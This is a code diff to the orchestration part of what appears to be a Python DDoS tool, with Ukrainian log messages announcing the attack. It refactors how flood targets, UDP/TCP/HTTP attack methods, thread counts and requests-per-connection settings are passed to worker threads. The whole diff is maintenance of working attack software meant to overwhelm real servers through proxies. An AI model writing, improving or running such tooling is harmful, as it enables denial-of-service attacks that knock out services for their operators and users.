@@ -20,7 +20,7 @@ from src.system import fix_ulimits
 from src.targets import Targets
 
 
-Params = namedtuple('Params', 'url, ip, method, threads')
+Params = namedtuple('Params', 'target, method, threads')
 
 PAD_THREADS = 30
 
@@ -70,21 +70,21 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
-        ip = resolve_host(target.url.host)
+        assert target.is_resolved, "Unresolved target cannot be used for attack"
         # UDP
         if target.is_udp:
-            params_list.append(Params(target.url, ip, target.method or 'UDP', UDP_THREADS))
+            params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
 
         # TCP
         elif target.url.scheme == "tcp" or target.method is not None:
             params_list.append(
-                Params(target.url, ip, target.method or 'TCP', threads_per_target))
+                Params(target, target.method or 'TCP', threads_per_target))
 
         # HTTP(S), methods from --http-methods
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append(Params(target.url, ip, method, threads))
+                params_list.append(Params(target, method, threads))
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
     statistics = {}
@@ -94,8 +94,11 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
         thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
         statistics[params] = thread_statistics
         kwargs = {
-            **params._asdict(),
-            'rpc': rpc,
+            'url': params.target.url,
+            'ip': params.target.addr,
+            'method': params.method,
+            'threads': params.threads,
+            'rpc': int(params.target.option("rpc", "0")) or rpc,
             'thread_pool': thread_pool,
             'event': event,
             'statistics': thread_statistics,
@@ -105,7 +108,7 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
         if not table:
             logger.info(
                 f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
-                % (params.url.host, params.method, params.threads))
+                % (params.target.url.host, params.method, params.threads))
 
     if not (table or debug):
         print_progress(period, 0, len(proxies))
